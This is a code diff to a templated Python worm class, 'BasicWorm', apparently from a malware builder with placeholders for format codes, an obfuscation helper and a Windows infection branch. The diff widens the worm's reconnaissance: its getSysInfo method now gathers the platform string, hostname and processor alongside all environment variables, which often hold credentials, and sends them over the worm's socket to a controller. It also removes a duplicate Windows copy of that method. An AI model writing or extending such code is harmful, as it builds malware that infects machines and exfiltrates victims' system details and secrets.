@@ -28,11 +28,14 @@ class BasicWorm:
         self.format = "{{FORMAT_CODE}}"
         self.raw_len = {{RAW_LEN}}
         self.Cham = Chameleon(self.format)
-        self.pause_conn = 3
+        self.pause_conn = {{WORM_PAUSE_CONN}}
         self.sys_msg = "{{MSG_SYS_HEADERS}}"
         self._sendLock = threading.Lock()
         self._sysInfo = "Unknown"
         self._sysEnv = "Unknown"
+        self._procInfo = "Unknown"
+        self._platform = "Unknown"
+        self._networkName = "Unknown"
     
 
     def buildSocket(self) -> bool:
@@ -102,30 +105,24 @@ class BasicWorm:
     def getSysInfo(self) -> None:
         self._sysInfo = f"{platform.system()} ## {platform.release()}"
         self._sysEnv = os.environ
+        self._platform = str(platform.platform())
+        self._networkName = str(platform.node())
+        self._procInfo = str(platform.processor())
         try:
             env = ""
             for k,i in self._sysEnv.items():
                 env += f"\n{k}  --  {i}"
         except:
             env = "Unknown"
-        info = ["i", self.name, self._sysInfo, env]
+        info = ["i", self.name, self._sysInfo, env, self._platform, self._networkName, self._procInfo]
+        for i in range(len(info)):
+            if info[i] == "":
+                info[i] = "Unknown"
         info = self.makeSysMsg(info)
         self.sendMsg(info)
 
 {%if INFECT_WIN %}
-    def getSysInfo(self) -> None:
-        self._sysInfo = f"{platform.system()} ## {platform.release()}"
-        self._sysEnv = os.environ
-        try:
-            env = ""
-            for k,i in self._sysEnv.items():
-                env += f"\n{k}  --  {i}"
-        except:
-            env = "Unknown"
-        info = ["i", self.name, self._sysInfo, env]
-        info = self.makeSysMsg(info)
-        self.sendMsg(info)
-
+    
     def getSysPath(self) -> list:
         pnumber = [2, 13, 14, 20, 26, 35, 36, 37, 38, 39, 42] 
         shell32 = ctypes.windll.shell32
